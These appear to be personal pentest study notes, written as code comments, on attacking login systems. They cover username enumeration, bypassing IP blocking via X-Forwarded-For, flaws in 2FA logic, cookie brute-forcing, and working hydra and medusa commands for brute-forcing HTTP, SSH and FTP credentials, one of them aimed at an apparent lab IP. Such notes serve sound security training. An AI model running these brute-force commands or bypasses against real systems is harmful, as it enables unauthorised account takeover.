// Authentication
//! username : password
//* bruteforce types
// enumeration via different response
// enumeration via response time
//* blocking IP
// 1 => x-forwarded-for : diffrenet IP for each request
// 2 => some application reset the counter if you log in successfully so one brute force try then log in with your credentials and repeat
//* blocking by locking user account
// some times you can send multiple passwords on the same request password : ["", "", ""]
//! 2FA
//* flawed logic
// when they  log you in then if the code you privided is wrong they log you out so you can stay loged in and pass the logout phase
//* brute force
// the code can be brute forced if there is no securtiy mechanism
//! cookie
//* obvious format
// when it's format can be easily noticed then brute forced even that the login is well protected
//* weak hash
// there is usualy a kind of hash than can be reversed by dictionary searching
//! hydra
//* brute via authorization header
// hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt {host} http-get / -s {port}
//* brute force via post parameters
// hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f {host} -s {port} http-post-form "/:username=^USER^&password=^PASS^:F=exist in failure message"
// hydra -L top-usernames-shortlist.txt -P jane-filtered.txt -f 94.237.61.242 -s 41878 http-post-form "/:username=^USER^&password=^PASS^:F=exist in failure message"
//! medusa
//* brute force ssh creds
// medusa -h {host} -U usernames.txt -P passwords.txt -M ssh
//* brute force ftp creds
// medusa -h {host} -U username.txt -P 2020-200_most_used_passwords.txt -M ftp -t 5
